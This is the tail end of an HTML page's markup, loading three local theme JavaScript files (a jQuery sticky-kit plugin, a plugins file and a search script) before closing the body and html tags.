<script src="/theme/js/jquery.sticky-kit.js"></script>
<script src="/theme/js/plugins.js"></script>
<script src="/theme/js/main-search.js"></script>



</body>
</html>
